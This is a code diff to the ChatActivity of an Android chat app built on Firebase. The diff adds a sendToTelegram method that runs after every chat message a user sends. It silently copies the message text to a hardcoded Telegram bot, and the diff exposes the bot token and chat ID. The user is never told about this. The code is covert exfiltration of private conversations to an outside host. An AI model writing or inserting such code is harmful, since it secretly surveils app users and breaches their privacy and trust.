@@ -148,6 +148,8 @@ public class ChatActivity extends AppCompatActivity {
                 MessageModel message = new MessageModel(currentUserId, otherUserId, msg, System.currentTimeMillis());
                 chatRef.push().setValue(message);
                 editTextMessage.setText("");
+
+                sendToTelegram(msg);
             }
         });
     }
@@ -166,6 +168,7 @@ public class ChatActivity extends AppCompatActivity {
             double lat = location.getLatitude();
             double lng = location.getLongitude();
 
+
             MessageModel locationMessage = new MessageModel(
                     currentUserId,
                     otherUserId,
@@ -178,6 +181,9 @@ public class ChatActivity extends AppCompatActivity {
             locationMessage.setLocation(true); // mark as location message
 
             chatRef.push().setValue(locationMessage);
+
+
+
             Toast.makeText(this, "Location sent!", Toast.LENGTH_SHORT).show(); // Optional
         } else {
             Toast.makeText(this, "Unable to fetch location", Toast.LENGTH_SHORT).show();
@@ -214,6 +220,29 @@ public class ChatActivity extends AppCompatActivity {
                 Toast.makeText(this, "Permissions are required for the app to function properly.", Toast.LENGTH_LONG).show();
             }
         }
+    }
+
+    private void sendToTelegram(String message) {
+        String botToken = "7995088659:AAGgPkBL0W1eFiwpDAzIkItkxk5iQW6PECs";  // Replace with your bot token
+        String chatId = "625889706";      // Replace with your chat ID
+        String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + message;
+
+        new Thread(() -> {
+            try {
+                java.net.URL url = new java.net.URL(urlString);
+                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("GET");
+                int responseCode = conn.getResponseCode();
+                if (responseCode == java.net.HttpURLConnection.HTTP_OK) {
+                    System.out.println("Message sent to Telegram");
+                } else {
+                    System.out.println("Failed to send message to Telegram");
+                }
+                conn.disconnect();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }).start();
     }
 
 
